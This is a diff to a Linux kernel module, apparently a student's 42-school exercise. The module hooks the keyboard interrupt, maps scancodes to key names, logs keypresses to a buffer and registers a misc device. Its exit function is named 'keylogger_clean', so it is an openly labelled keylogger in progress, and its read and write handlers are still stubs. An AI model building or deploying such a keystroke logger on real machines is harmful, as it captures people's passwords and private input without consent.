@@ -7,6 +7,7 @@
 #include <linux/io.h>
 #include <linux/slab.h>
 #include <linux/fs.h>
+#include <linux/miscdevice.h>
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Sebastien Nicolet <snicolet@student.42.fr>");
@@ -22,6 +23,11 @@ struct key_map {
 	bool			pressed;
 	size_t			press_count;
 };
+
+static struct key_map		*key_tab;
+static struct key_map		*key_shift_left;
+static struct key_map		*key_shift_right;
+static bool			caps_lock;
 
 enum e_key_event {
 	PRESS,
@@ -58,10 +64,11 @@ static struct key_map key_table[] = {
 	(struct key_map){'7', 8, "7", false, 0},
 	(struct key_map){'8', 9, "8", false, 0},
 	(struct key_map){'9', 10, "9", false, 0},
-	(struct key_map){'-', 11, "-", false, 0},
-	(struct key_map){'=', 12, "=", false, 0},
-	(struct key_map){'\t', 15, "TAB", false, 0},
+	(struct key_map){'0', 11, "0", false, 0},
+	(struct key_map){'-', 12, "-", false, 0},
+	(struct key_map){'=', 13, "=", false, 0},
 	(struct key_map){0x7f, 14, "DEL", false, 0},
+	(struct key_map){'\t', 15, "TAB", false, 0},
 	(struct key_map){'q', 16, "q", false, 0},
 	(struct key_map){'w', 17, "w", false, 0},
 	(struct key_map){'e', 18, "e", false, 0},
@@ -103,11 +110,17 @@ static struct key_map key_table[] = {
 	(struct key_map){' ', 56, "Alt-Right", false, 0},
 	(struct key_map){' ', 57, "Space", false, 0},
 	(struct key_map){0x0, 58, "Caps-Lock", false, 0},
+	(struct key_map){0x0, 71, "Home", false, 0},
+	(struct key_map){0x0, 72, "Arrow-Up", false, 0},
+	(struct key_map){0x0, 73, "Page-Up", false, 0},
 	(struct key_map){0x0, 75, "Arrow-Left", false, 0},
 	(struct key_map){0x0, 77, "Arrow-Right", false, 0},
-	(struct key_map){0x0, 72, "Arrow-Up", false, 0},
+	(struct key_map){0x0, 79, "End", false, 0},
 	(struct key_map){0x0, 80, "Arrow-Down", false, 0},
+	(struct key_map){0x0, 81, "Page-Down", false, 0},
+	(struct key_map){0x0, 82, "Insert", false, 0},
 	(struct key_map){0x0, 92, "Command-Right", false, 0},
+	(struct key_map){0x0, 93, "Menu", false, 0},
 	(struct key_map){0x0, 0, NULL, false, 0}
 };
 
@@ -127,12 +140,14 @@ static struct key_map *get_key(const unsigned int scancode)
 static ssize_t	read_key(struct file *file, char __user *buf, size_t size,
 			 loff_t *offset)
 {
+	pr_info("reading device\n");
 	return 0;
 }
 
 static ssize_t	write_key(struct file *file, const char __user *buf,
 			  size_t size, loff_t *offset)
 {
+	pr_info("writing on device\n");
 	return 0;
 }
 
@@ -162,7 +177,13 @@ static irqreturn_t	key_handler(int irq, void *dev_id)
 	return IRQ_HANDLED;
 }
 
-static void		__exit hello_cleanup(void)
+static struct miscdevice		dev = {
+	MISC_DYNAMIC_MINOR,
+	MODULE_NAME,
+	&ops
+};
+
+static void		__exit keylogger_clean(void)
 {
 	pr_info(MODULE_NAME "Cleaning up module.\n");
 	free_irq(KEYBOARD_IRQ, &key_handler);
@@ -173,25 +194,36 @@ static void		__exit hello_cleanup(void)
 		key_log.buf = NULL;
 		key_log.size = 0;
 	}
+	misc_deregister(&dev);
 }
 
 static int		__init hello_init(void)
 {
 	int		ret;
 
+	pr_info(MODULE_NAME "init !\n");
+	caps_lock = false;
+	key_tab = get_key(14);
+	key_shift_left = get_key(42);
+	key_shift_right = get_key(54);
 	key_log = (struct smart_buffer){
 		.buf = NULL,
 		.size = 0
 	};
-	pr_info(MODULE_NAME "init !\n");
 	ret = request_irq(KEYBOARD_IRQ, &key_handler, IRQF_SHARED, MODULE_NAME,
 		&key_handler);
 	if (ret < 0) {
 		pr_err("failed to request keyboard irq: %d\n", ret);
 		return ret;
 	}
+	ret = misc_register(&dev);
+	if (ret < 0) {
+		pr_err("failed to register device.\n");
+		free_irq(KEYBOARD_IRQ, &key_handler);
+		return 1;
+	}
 	return 0;
 }
 
 module_init(hello_init);
-module_exit(hello_cleanup);
+module_exit(keylogger_clean);
